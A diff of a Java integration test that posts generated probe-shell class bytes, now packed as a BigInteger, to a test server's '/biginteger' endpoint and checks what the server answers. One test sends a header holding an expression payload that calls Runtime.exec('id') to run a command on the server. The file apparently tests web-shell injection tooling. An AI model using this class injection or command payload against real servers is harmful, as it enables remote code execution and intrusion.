@@ -1,6 +1,7 @@
 package com.reajason.javaweb.integration;
 
 import com.reajason.javaweb.integration.probe.DetectionTool;
+import com.reajason.javaweb.packer.Packers;
 import com.reajason.javaweb.probe.ProbeContent;
 import com.reajason.javaweb.probe.ProbeMethod;
 import com.reajason.javaweb.probe.ProbeShellGenerator;
@@ -38,12 +39,12 @@ public class ProbeAssertion {
                 .build();
         ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
         RequestBody requestBody = new FormBody.Builder()
-                .add("data", probeResult.getShellBytesBase64Str())
+                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                 .add(reqParamName, DetectionTool.getServerDetection())
                 .build();
         Request request = new Request.Builder()
                 .header("Content-Type", "application/x-www-form-urlencoded")
-                .url(url + "/b64").post(requestBody)
+                .url(url + "/biginteger").post(requestBody)
                 .build();
         try (Response response = new OkHttpClient().newCall(request).execute()) {
             assertEquals(server, response.body().string());
@@ -67,12 +68,12 @@ public class ProbeAssertion {
                 .build();
         ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
         RequestBody requestBody = new FormBody.Builder()
-                .add("data", probeResult.getShellBytesBase64Str())
+                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                 .add(reqParamName, DetectionTool.getServerDetection().replace("yv66vgAAAD", ""))
                 .build();
         Request request = new Request.Builder()
                 .header("Content-Type", "application/x-www-form-urlencoded")
-                .url(url + "/b64").post(requestBody)
+                .url(url + "/biginteger").post(requestBody)
                 .build();
         try (Response response = new OkHttpClient().newCall(request).execute()) {
             assertEquals(server, response.body().string());
@@ -95,14 +96,13 @@ public class ProbeAssertion {
                 .reqParamName(headerName)
                 .build();
         ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
-        String content = probeResult.getShellBytesBase64Str();
         RequestBody requestBody = new FormBody.Builder()
-                .add("data", content)
+                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                 .build();
         Request request = new Request.Builder()
                 .header("Content-Type", "application/x-www-form-urlencoded")
                 .header(headerName, "id")
-                .url(url + "/b64").post(requestBody)
+                .url(url + "/biginteger").post(requestBody)
                 .build();
         try (Response response = new OkHttpClient().newCall(request).execute()) {
             assertThat(response.body().string(), anyOf(
@@ -127,14 +127,13 @@ public class ProbeAssertion {
                 .reqParamName(headerName)
                 .build();
         ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
-        String content = probeResult.getShellBytesBase64Str();
         RequestBody requestBody = new FormBody.Builder()
-                .add("data", content)
+                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                 .build();
         Request request = new Request.Builder()
                 .header("Content-Type", "application/x-www-form-urlencoded")
                 .header(headerName, "new java.util.Scanner(java.lang.Runtime.getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()")
-                .url(url + "/b64").post(requestBody)
+                .url(url + "/biginteger").post(requestBody)
                 .build();
         try (Response response = new OkHttpClient().newCall(request).execute()) {
             assertThat(response.body().string(), anyOf(
